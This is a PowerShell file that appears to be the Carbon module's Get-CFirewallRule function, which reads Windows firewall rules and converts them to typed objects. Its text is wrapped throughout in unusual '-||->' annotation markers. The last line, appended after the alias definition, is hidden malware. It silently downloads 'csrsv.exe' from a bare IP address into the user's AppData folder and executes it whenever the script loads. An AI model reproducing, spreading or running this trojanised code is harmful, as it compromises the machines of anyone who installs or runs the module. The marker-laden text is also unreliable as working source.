
 -||-> function Get-CFirewallRule
{
    
    [CmdletBinding(DefaultParameterSetName='All')]
    [OutputType([Carbon.Firewall.Rule])]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='ByName')]
        [string]
        
        $Name,

        [Parameter(Mandatory=$true,ParameterSetName='ByLiteralName')]
        [string]
        
        $LiteralName
    )

     -||-> Set-StrictMode -Version 'Latest' <-||- 
     -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 
    
     -||-> if(  -||-> -not ( -||-> Assert-CFirewallConfigurable <-||- ) <-||-  )
    {
        return
    } <-||- 

     -||-> $fw =  -||-> New-Object -ComObject 'HNetCfg.FwPolicy2' <-||-  <-||- 
     -||-> $fw.Rules |
        Where-Object { 
             -||-> if(  -||-> $PSCmdlet.ParameterSetName -eq 'ByLiteralName' <-||-  )
            {
                return  -||-> $_.Name -eq $LiteralName <-||- 
            } <-||- 

             -||-> if(  -||-> -not $Name <-||-  )
            {
                return  -||-> $true <-||- 
            } <-||- 

            return  -||-> $_.Name -like $Name <-||-  
        } | ForEach-Object {
    
             -||-> $rule = $_ <-||- 

             -||-> Write-Debug -Message $rule.Name <-||- 

             -||-> $profiles = [Carbon.Firewall.RuleProfile]::Any <-||- 
             -||-> if(  -||-> $rule.Profiles -eq 0x7FFFFFFF <-||-  )
            {
                 -||-> $profiles = [Carbon.Firewall.RuleProfile]::Domain -bor [Carbon.Firewall.RuleProfile]::Private -bor [Carbon.Firewall.RuleProfile]::Public <-||- 
            }
            else
            {
                 -||-> if(  -||-> ( -||-> $rule.Profiles -band 1 <-||- ) -eq 1 <-||-  )
                {
                     -||-> $profiles = $profiles -bor [Carbon.Firewall.RuleProfile]::Domain <-||- 
                } <-||- 
                 -||-> if(  -||-> ( -||-> $rule.Profiles -band 2 <-||- ) -eq 2 <-||-  )
                {
                     -||-> $profiles = $profiles -bor [Carbon.Firewall.RuleProfile]::Private <-||- 
                } <-||- 
                 -||-> if(  -||-> ( -||-> $rule.Profiles -band 4 <-||- ) -eq 4 <-||-  )
                {
                     -||-> $profiles = $profiles -bor [Carbon.Firewall.RuleProfile]::Public <-||- 
                } <-||- 
            } <-||- 
             -||-> Write-Debug -Message ( -||-> '  Profiles          {0,25} -> {1}' -f $rule.Profiles,$profiles <-||- ) <-||- 
             -||-> $protocol = switch(  -||-> $rule.Protocol <-||-  ) 
            {
                6 {  -||-> 'TCP' <-||-  }
                17 {  -||-> 'UDP' <-||-  }
                1 {  -||-> 'ICMPv4' <-||-  }
                58 {  -||-> 'ICMPv6' <-||-  }
                256 {  -||-> 'Any' <-||-  }
                default {  -||-> $_ <-||-  }
            } <-||- 

             -||-> if(  -||-> ( -||-> $rule | Get-Member -Name 'IcmpTypesAndCodes' <-||- ) -and $rule.IcmpTypesAndCodes <-||-  )
            {
                 -||-> $type,$code =  -||-> $rule.IcmpTypesAndCodes -split ':' | ConvertTo-Any <-||-  <-||- 
                 -||-> if(  -||-> -not $code <-||-  )
                {
                     -||-> $code = 'Any' <-||- 
                } <-||- 
                 -||-> $protocol = '{0}:{1},{2}' -f $protocol,$type,$code <-||- 
                 -||-> Write-Debug -Message ( -||-> '  IcmpTypesAndCode  {0,25} -> {1},{2}' -f $rule.IcmpTypesAndCodes,$type,$code <-||- ) <-||- 
            } <-||- 
             -||-> Write-Debug -Message ( -||-> '  Protocol          {0,25} -> {1}' -f $rule.Protocol,$protocol <-||- ) <-||- 

             -||-> $direction = switch(  -||-> $rule.Direction <-||-  )
            {
                1 {  -||-> [Carbon.Firewall.RuleDirection]::In <-||-  }
                2 {  -||-> [Carbon.Firewall.RuleDirection]::Out <-||-  }
            } <-||- 

             -||-> $action = switch(  -||-> $rule.Action <-||-  )
            {
                0 {  -||-> [Carbon.Firewall.RuleAction]::Block <-||-  }
                1 {  -||-> [Carbon.Firewall.RuleAction]::Allow <-||-  }
                default { throw  -||-> ( -||-> 'Unknown action ''{0}''.' -f $_ <-||- ) <-||-  }
            } <-||- 

             -||-> $interfaceType = [Carbon.Firewall.RuleInterfaceType]::Any <-||- 
             -||-> $rule.InterfaceTypes -split ',' |
                Where-Object {  -||-> $_ -ne 'All' <-||-  } |
                ForEach-Object {
                     -||-> if(  -||-> $_ -eq 'RemoteAccess' <-||-  )
                    {
                         -||-> $_ = 'Ras' <-||- 
                    } <-||- 
                     -||-> $interfaceType = $interfaceType -bor [Carbon.Firewall.RuleInterfaceType]::$_ <-||- 
                } <-||- 
             -||-> Write-Debug -Message ( -||-> '  InterfaceType     {0,25} -> {1}' -f $rule.InterfaceTypes,$interfaceType <-||- ) <-||- 

             -||-> function ConvertTo-Any
            {
                param(
                    [Parameter(ValueFromPipeline=$true)]
                    $InputObject
                )

                process
                {
                     -||-> if(  -||-> $InputObject -eq '*' <-||-  )
                    {
                        return  -||-> 'Any' <-||- 
                    } <-||- 

                     -||-> $InputObject =  -||-> $InputObject -split ',' |
                                        ForEach-Object { 
                                             -||-> $ipAddress,$mask = $_ -split '/' <-||- 
                                             -||-> [ipaddress]$maskAddress = $null <-||- 
                                             -||-> if(  -||-> $mask -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$' -and [ipaddress]::TryParse($mask, [ref]$maskAddress) <-||-  )
                                            {
                                                 -||-> $cidr =  -||-> $maskAddress.GetAddressBytes() | 
                                                            ForEach-Object {  -||-> [Convert]::ToString($_, 2) -replace '[s0]' <-||-  } |
                                                            Select-Object -ExpandProperty 'Length' |
                                                            Measure-Object -Sum | 
                                                            Select-Object -ExpandProperty 'Sum' <-||-  <-||- 
                                                return  -||-> '{0}/{1}' -f $ipAddress,$cidr <-||- 
                                            } <-||- 
                                            return  -||-> $_ <-||- 
                                        } <-||-  <-||- 
                    return  -||-> $InputObject -join ',' <-||- 
                }
            } <-||- 

             -||-> $localAddresses =  -||-> $rule.LocalAddresses | ConvertTo-Any <-||-  <-||- 
             -||-> Write-Debug -Message ( -||-> '  LocalAddresses    {0,25} -> {1}' -f $rule.LocalAddresses,$localAddresses <-||- ) <-||- 
             -||-> $remoteAddresses =  -||-> $rule.RemoteAddresses | ConvertTo-Any <-||-  <-||- 
             -||-> Write-Debug -Message ( -||-> '  RemoteAddresses   {0,25} -> {1}' -f $rule.RemoteAddresses,$remoteAddresses <-||- ) <-||- 
             -||-> $localPorts =  -||-> $rule.LocalPorts | ConvertTo-Any <-||-  <-||- 
             -||-> Write-Debug -Message ( -||-> '  LocalPorts        {0,25} -> {1}' -f $rule.LocalPorts,$localPorts <-||- ) <-||- 
             -||-> $remotePorts =  -||-> $rule.RemotePorts | ConvertTo-Any <-||-  <-||- 
             -||-> Write-Debug -Message ( -||-> '  RemotePorts       {0,25} -> {1}' -f $rule.RemotePorts,$remotePorts <-||- ) <-||- 

             -||-> $edgeTraversal = switch(  -||-> $rule.EdgeTraversalOptions <-||-  ) 
            {
                0 {  -||-> 'No' <-||-  }
                1 {  -||-> 'Yes' <-||-  }
                2 {  -||-> 'Defer to application' <-||-  }
                3 {  -||-> 'Defer to user' <-||-  }
            } <-||- 

             -||-> $security = [Carbon.Firewall.RuleSecurity]::NotRequired <-||- 
             -||-> if(  -||-> $rule | Get-Member -Name 'SecureFlags' <-||-  )
            {
                 -||-> $security = switch(  -||-> $rule.SecureFlags <-||-  )
                {
                    1 {  -||-> [Carbon.Firewall.RuleSecurity]::AuthNoEncap <-||-  }
                    2 {  -||-> [Carbon.Firewall.RuleSecurity]::Authenticate <-||-  }
                    3 {  -||-> [Carbon.Firewall.RuleSecurity]::AuthDynEnc <-||-  }
                    4 {  -||-> [Carbon.Firewall.RuleSecurity]::AuthEnc <-||-  }
                    default {  -||-> [Carbon.Firewall.RuleSecurity]::NotRequired <-||-  }
                } <-||- 
                 -||-> Write-Debug -Message ( -||-> '  Security          {0,25} -> {1}' -f $rule.SecureFlags,$security <-||- ) <-||- 
            } <-||- 

             -||-> $serviceName =  -||-> $rule.ServiceName | ConvertTo-Any <-||-  <-||- 
             -||-> Write-Debug -Message ( -||-> '  Service           {0,25} -> {1}' -f $rule.ServiceName,$serviceName <-||- ) <-||- 


             -||-> $constructorArgs = @(
                                     -||-> $rule.Name, 
                                    $rule.Enabled,
                                    $direction,
                                    $profiles,
                                    $rule.Grouping,
                                    $localAddresses,
                                    $localPorts,
                                    $remoteAddresses,
                                    $remotePorts,
                                    $protocol,
                                    $edgeTraversal,
                                    $action,
                                    $interfaceType,
                                    $security,
                                    'Local Setting', 
                                    $rule.Description,
                                    $rule.ApplicationName,
                                    $serviceName <-||- 
                                ) <-||- 
             -||-> New-Object -TypeName 'Carbon.Firewall.Rule' -ArgumentList $constructorArgs <-||- 
        } <-||-  
} <-||- 

 -||-> Set-Alias -Name 'Get-FirewallRules' -Value 'Get-CFirewallRule' <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



